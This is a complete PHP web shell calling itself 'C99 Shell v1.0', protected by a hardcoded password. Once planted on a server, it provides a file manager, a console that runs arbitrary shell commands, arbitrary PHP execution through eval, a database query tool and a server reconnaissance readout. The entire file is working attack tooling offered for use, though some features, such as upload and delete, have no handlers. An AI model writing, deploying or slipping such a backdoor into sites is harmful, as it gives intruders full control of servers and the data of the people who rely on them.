<?php
/*
C99 Shell v1.0
https://github.com/...
*/

// Configuration
$password = "hack@123"; // CHANGE THIS
$version = "1.0";
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = "UTF-8";

// Disable error reporting
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', '-1');

// Authentication
if(!isset($_SESSION['logged'])) {
    if(isset($_POST['pass']) && md5($_POST['pass']) == md5($password)) {
        $_SESSION['logged'] = true;
    } else {
        echo '<!DOCTYPE html><html><head><title>Login</title></head><body>';
        echo '<form method="post"><input type="password" name="pass" placeholder="Password"><input type="submit"></form>';
        echo '</body></html>';
        exit;
    }
}

// Main Class
class C99Shell {
    public $home_cwd;
    public $cwd;
    public $win;
    public $safe_mode;
    public $mysql_conn;
    
    public function __construct() {
        $this->home_cwd = @getcwd();
        $this->cwd = $this->home_cwd;
        $this->win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
        $this->safe_mode = @ini_get('safe_mode');
    }
    
    public function actionFilesMan() {
        $out = '<h2>📁 File Manager</h2>';
        
        // Current directory
        $dir = isset($_GET['dir']) ? $_GET['dir'] : $this->cwd;
        $this->cwd = $dir;
        
        // Navigation
        $out .= '<form method="get">';
        $out .= '<input type="hidden" name="a" value="FilesMan">';
        $out .= 'Path: <input type="text" name="dir" value="'.$dir.'" size="60"> ';
        $out .= '<input type="submit" value="Go">';
        $out .= '</form>';
        
        // File operations
        $out .= '<h3>📤 Upload File</h3>';
        $out .= '<form method="post" enctype="multipart/form-data">';
        $out .= '<input type="hidden" name="a" value="FilesMan">';
        $out .= '<input type="file" name="file"> ';
        $out .= '<input type="submit" name="upload" value="Upload">';
        $out .= '</form>';
        
        // List files
        $files = @scandir($dir);
        $out .= '<h3>📋 Files in '.$dir.'</h3>';
        $out .= '<table border="1" width="100%">';
        $out .= '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr>';
        
        foreach($files as $file) {
            if($file == '.' || $file == '..') continue;
            
            $path = $dir . '/' . $file;
            $size = is_dir($path) ? '[DIR]' : $this->formatSize(@filesize($path));
            $perms = substr(sprintf('%o', @fileperms($path)), -4);
            $modified = @date('Y-m-d H:i:s', @filemtime($path));
            
            $out .= '<tr>';
            $out .= '<td>'.(is_dir($path) ? '<b>'.$file.'</b>' : $file).'</td>';
            $out .= '<td align="right">'.$size.'</td>';
            $out .= '<td align="center">'.$perms.'</td>';
            $out .= '<td>'.$modified.'</td>';
            $out .= '<td>';
            
            if(is_dir($path)) {
                $out .= '<a href="?a=FilesMan&dir='.urlencode($path).'">Open</a> | ';
                $out .= '<a href="?a=FilesMan&delete='.urlencode($path).'" onclick="return confirm(\'Delete?\')">Delete</a>';
            } else {
                $out .= '<a href="?a=FilesMan&view='.urlencode($path).'">View</a> | ';
                $out .= '<a href="?a=FilesMan&edit='.urlencode($path).'">Edit</a> | ';
                $out .= '<a href="?a=FilesMan&download='.urlencode($path).'">Download</a> | ';
                $out .= '<a href="?a=FilesMan&delete='.urlencode($path).'" onclick="return confirm(\'Delete?\')">Delete</a>';
            }
            
            $out .= '</td></tr>';
        }
        
        $out .= '</table>';
        return $out;
    }
    
    public function actionConsole() {
        $out = '<h2>💻 Command Console</h2>';
        
        $out .= '<form method="post">';
        $out .= '<input type="hidden" name="a" value="Console">';
        $out .= 'Command: <input type="text" name="cmd" value="'.(isset($_POST['cmd'])?$_POST['cmd']:'id').'" size="60"> ';
        $out .= '<input type="submit" value="Execute">';
        $out .= '</form>';
        
        if(isset($_POST['cmd'])) {
            $out .= '<h3>Output:</h3>';
            $out .= '<pre>';
            $out .= htmlspecialchars(@shell_exec($_POST['cmd'] . ' 2>&1'));
            $out .= '</pre>';
        }
        
        return $out;
    }
    
    public function actionSql() {
        $out = '<h2>🗄️ SQL Manager</h2>';
        
        // Connection form
        $out .= '<form method="post">';
        $out .= '<input type="hidden" name="a" value="Sql">';
        $out .= 'Host: <input type="text" name="host" value="localhost"><br>';
        $out .= 'User: <input type="text" name="user" value="root"><br>';
        $out .= 'Pass: <input type="password" name="pass"><br>';
        $out .= 'Database: <input type="text" name="db"><br>';
        $out .= '<input type="submit" name="connect" value="Connect">';
        $out .= '</form>';
        
        // Connect to database
        if(isset($_POST['connect'])) {
            $this->mysql_conn = @mysqli_connect($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
            
            if($this->mysql_conn) {
                $out .= '<h3>✅ Connected!</h3>';
                
                // Query form
                $out .= '<form method="post">';
                $out .= '<input type="hidden" name="a" value="Sql">';
                $out .= '<input type="hidden" name="host" value="'.$_POST['host'].'">';
                $out .= '<input type="hidden" name="user" value="'.$_POST['user'].'">';
                $out .= '<input type="hidden" name="pass" value="'.$_POST['pass'].'">';
                $out .= '<input type="hidden" name="db" value="'.$_POST['db'].'">';
                $out .= '<textarea name="query" rows="5" cols="80">SHOW TABLES</textarea><br>';
                $out .= '<input type="submit" name="execute" value="Execute Query">';
                $out .= '</form>';
                
                if(isset($_POST['execute'])) {
                    $result = @mysqli_query($this->mysql_conn, $_POST['query']);
                    if($result) {
                        $out .= '<table border="1">';
                        while($row = @mysqli_fetch_assoc($result)) {
                            $out .= '<tr>';
                            foreach($row as $cell) {
                                $out .= '<td>'.htmlspecialchars($cell).'</td>';
                            }
                            $out .= '</tr>';
                        }
                        $out .= '</table>';
                    } else {
                        $out .= 'Error: '.@mysqli_error($this->mysql_conn);
                    }
                }
            } else {
                $out .= '❌ Connection failed!';
            }
        }
        
        return $out;
    }
    
    public function actionPhp() {
        $out = '<h2>🐘 PHP Code</h2>';
        
        $out .= '<form method="post">';
        $out .= '<input type="hidden" name="a" value="Php">';
        $out .= '<textarea name="code" rows="10" cols="80">&lt;?php phpinfo(); ?&gt;</textarea><br>';
        $out .= '<input type="submit" value="Execute">';
        $out .= '</form>';
        
        if(isset($_POST['code'])) {
            $out .= '<h3>Result:</h3>';
            $out .= '<pre>';
            ob_start();
            eval($_POST['code']);
            $out .= htmlspecialchars(ob_get_clean());
            $out .= '</pre>';
        }
        
        return $out;
    }
    
    public function actionNetwork() {
        $out = '<h2>🌐 Network Tools</h2>';
        
        $out .= '<form method="post">';
        $out .= '<input type="hidden" name="a" value="Network">';
        $out .= 'Host: <input type="text" name="host" value="localhost"> ';
        $out .= '<select name="tool">';
        $out .= '<option value="ping">Ping</option>';
        $out .= '<option value="nslookup">DNS Lookup</option>';
        $out .= '<option value="whois">Whois</option>';
        $out .= '<option value="traceroute">Traceroute</option>';
        $out .= '</select> ';
        $out .= '<input type="submit" value="Run">';
        $out .= '</form>';
        
        if(isset($_POST['host'])) {
            $out .= '<h3>Result:</h3>';
            $out .= '<pre>';
            
            switch($_POST['tool']) {
                case 'ping':
                    $out .= htmlspecialchars(@shell_exec('ping -c 4 '.escapeshellarg($_POST['host']).' 2>&1'));
                    break;
                case 'nslookup':
                    $out .= htmlspecialchars(@shell_exec('nslookup '.escapeshellarg($_POST['host']).' 2>&1'));
                    break;
                case 'whois':
                    $out .= htmlspecialchars(@shell_exec('whois '.escapeshellarg($_POST['host']).' 2>&1'));
                    break;
                case 'traceroute':
                    $out .= htmlspecialchars(@shell_exec('traceroute '.escapeshellarg($_POST['host']).' 2>&1'));
                    break;
            }
            
            $out .= '</pre>';
        }
        
        return $out;
    }
    
    private function formatSize($bytes) {
        if($bytes >= 1073741824) {
            return number_format($bytes / 1073741824, 2) . ' GB';
        } elseif($bytes >= 1048576) {
            return number_format($bytes / 1048576, 2) . ' MB';
        } elseif($bytes >= 1024) {
            return number_format($bytes / 1024, 2) . ' KB';
        } else {
            return $bytes . ' bytes';
        }
    }
}

// Main Execution
$shell = new C99Shell();
$action = isset($_GET['a']) ? $_GET['a'] : $default_action;

// HTML Header
echo '<!DOCTYPE html>
<html>
<head>
    <title>C99 Shell v'.$version.'</title>
    <meta charset="'.$default_charset.'">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
        .header { background: #333; color: white; padding: 15px; border-radius: 5px; }
        .menu { background: #666; color: white; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .menu a { color: white; margin-right: 15px; text-decoration: none; }
        .menu a:hover { text-decoration: underline; }
        .content { background: white; padding: 20px; border-radius: 5px; }
        pre { background: #f8f8f8; padding: 10px; border: 1px solid #ddd; overflow: auto; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #eee; }
        td, th { border: 1px solid #ddd; padding: 8px; }
    </style>
</head>
<body>

<div class="header">
    <h1>🐚 C99 Shell v'.$version.'</h1>
    <p>Server: '.$_SERVER['SERVER_SOFTWARE'].' | PHP: '.phpversion().' | User: '.@exec('whoami').'</p>
</div>

<div class="menu">
    <a href="?a=FilesMan">📁 Files</a>
    <a href="?a=Console">💻 Console</a>
    <a href="?a=Sql">🗄️ SQL</a>
    <a href="?a=Php">🐘 PHP</a>
    <a href="?a=Network">🌐 Network</a>
    <a href="?logout=1">🚪 Logout</a>
</div>

<div class="content">';

// Handle actions
switch($action) {
    case 'FilesMan':
        echo $shell->actionFilesMan();
        break;
    case 'Console':
        echo $shell->actionConsole();
        break;
    case 'Sql':
        echo $shell->actionSql();
        break;
    case 'Php':
        echo $shell->actionPhp();
        break;
    case 'Network':
        echo $shell->actionNetwork();
        break;
    default:
        echo '<h2>Welcome to C99 Shell</h2>';
        echo '<p>Select an option from the menu above.</p>';
        
        // Server info
        echo '<h3>📊 Server Information:</h3>';
        echo '<pre>';
        echo 'OS: '.php_uname()."\n";
        echo 'PHP: '.phpversion()."\n";
        echo 'Safe Mode: '.($shell->safe_mode ? 'On' : 'Off')."\n";
        echo 'Disabled Functions: '.@ini_get('disable_functions')."\n";
        echo 'Open Basedir: '.@ini_get('open_basedir')."\n";
        echo '</pre>';
        break;
}

// Logout
if(isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

echo '</div>
</body>
</html>';
?>